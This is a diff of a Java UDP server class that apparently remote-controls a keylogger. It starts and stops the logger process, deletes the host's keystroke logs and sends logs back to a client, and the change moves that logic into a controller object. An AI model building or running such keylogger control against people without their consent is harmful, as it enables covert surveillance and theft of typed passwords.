@@ -138,63 +138,29 @@ public class UDPServerHelper {
 			}
 		}
 
-		private void startLogger() {			
-			// check if key logger is running
-			String line;
-			String pidInfo = "";
-
-			Process p;
-			try {
-				p = Runtime.getRuntime().exec(System.getenv("windir") + "//system32//" + "tasklist.exe");
-
-				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
-
-				while ((line = input.readLine()) != null) {
-					pidInfo += line;
-				}
-
-				input.close();
-			} catch (IOException e) {
-				e.printStackTrace();
-			}
-
-			if (pidInfo.contains(Resources.KEY_LOGGER_NAME)) {
+		private void startLogger() {
+			if (controller.startLogger()) {
 				sendMessageToClient(Resources.START_LOGGER + "?true?Logger started!");
-				return;
-			}
-			
-			// if key logger is not running
-			
-			try {
-				String programPath = new File(Resources.KEY_LOGGER_PATH).getAbsolutePath();
-				Runtime.getRuntime().exec(Resources.START_LOGGER_BATCH_FILE_NAME);
-			} catch (Exception e) {
-				e.printStackTrace();
+			} else {
 				sendMessageToClient(Resources.START_LOGGER + "?false?Can not start logger!");
 			}
-			sendMessageToClient(Resources.START_LOGGER + "?true?Logger started!");
+
 		}
 
 		private void stopLogger() {
-			try {
-				Runtime.getRuntime().exec("taskkill /F /IM " + Resources.KEY_LOGGER_NAME);
-			} catch (IOException e) {
-				e.printStackTrace();
+			if (controller.stopLogger()) {
+				sendMessageToClient(Resources.STOP_LOGGER + "?true?Logger is stopped!");
+			} else {
 				sendMessageToClient(Resources.STOP_LOGGER + "?false?Can not stop logger!");
 			}
-			sendMessageToClient(Resources.STOP_LOGGER + "?true?Logger is stopped!");
 		}
 
 		private void deleteAllHostLogs() {
-			File logFolder = new File(Resources.LOGS_DIRECTORY);
-			for (File f : logFolder.listFiles()) {
-				try {
-					f.delete();
-				} catch (Exception e) {
-					sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?false?Can not delete all log files!");
-				}
+			if (controller.deleteAllHostLogs()) {
+				sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?true?All logs are deleted!");
+			} else {
+				sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?false?Can not delete all log files!");
 			}
-			sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?true?All logs are deleted!");
 		}
 
 		private void getAllLogsAndSend() {
